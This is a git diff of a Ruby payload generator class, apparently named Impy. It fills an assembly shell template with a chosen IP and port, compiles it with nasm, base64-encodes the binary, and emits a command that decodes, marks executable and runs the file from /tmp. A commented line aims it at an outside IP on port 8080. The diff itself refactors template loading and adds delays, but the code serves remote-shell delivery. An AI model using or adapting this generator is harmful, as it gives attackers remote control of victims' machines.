@@ -5,9 +5,13 @@ require 'securerandom'
 class Impy
     def initialize(filename = "shell.asm")
         @filename = filename
-        @asm = File.open(@filename, "r").read()
+        @asm = ""
         @ip = "127.0.0.1"
         @port = "4444"
+    end
+
+    def openTemplate()
+        @asm = File.open(@filename, "r").read()
     end
 
     def hexFormatIp(ip)
@@ -53,6 +57,9 @@ class Impy
     end
 
     def modifyASM(ip, port)
+        @asm = ""
+        openTemplate()
+
         ip = hexFormatIp(ip)
         port = hexFormatPort(port)
 
@@ -71,8 +78,12 @@ class Impy
         end
         tmp.close()
 
+        sleep 1
+
         # Compile ASM to Binary
         `nasm -o .tmp.compiled.#{random_str} .tmp.#{random_str}`
+
+        sleep 1
 
         # Read binary and convert to base64
         base64 = Base64.strict_encode64(File.open(".tmp.compiled.#{random_str}", "rb").read)
@@ -109,6 +120,7 @@ class Impy
         if good_ip and good_port
             begin
                 modifyASM(ip, port)
+                sleep 0.1
                 base64 = compileToBase64()
                 output += "base64 -d <<< #{base64} > /tmp/0; chmod +x /tmp/0; /tmp/0"
             rescue => e
@@ -123,5 +135,6 @@ class Impy
 
 end
 
-# impy = Impy.new('shell2.asm')
+# impy = Impy.new('shell.asm')
 # puts impy.genPayload("163.172.213.104", "8080")
+# puts impy.genPayload("127.0.0.1", "8080")
